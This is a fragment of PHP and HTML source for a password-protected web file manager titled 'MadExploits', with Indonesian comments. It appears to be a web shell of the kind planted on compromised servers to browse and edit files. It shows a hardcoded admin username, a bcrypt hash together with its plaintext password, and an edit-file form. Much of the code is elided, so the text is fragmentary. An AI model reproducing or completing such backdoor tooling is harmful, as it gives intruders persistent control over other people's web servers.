...
// ====================================
// 🔐 BAGIAN LOGIN & PASSWORD
// ====================================

// Ganti ini dengan username lo
$valid_username = "admin";

// Hash bcrypt hasil dari password "Resiliants"
// lo bisa generate pakai: password_hash("Resiliants", PASSWORD_BCRYPT)
$valid_password_hash = '$2y$10$F00.0mvbzoa2Lk3TKuIEg.BIqNbVlgCC.tfP9d6w5M/PnGYXPYioO'; 
// (contoh hash, bisa lo ganti sesuai password asli lo)
...
<head>
  ...
  <title>File Manager - MadExploits</title>
  ...
  <div id="editModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70">
    <div class="bg-gray-900 w-full max-w-3xl rounded-lg shadow-xl p-6">
      <div class="flex justify-between items-center mb-4">
        ...
        <a href="?dir=<?php echo urlencode($currentDir); ?>" class="text-gray-400 hover:text-red-400 text-xl font-bold">Ã—</a>
      </div>
      <form method="POST" class="space-y-4">
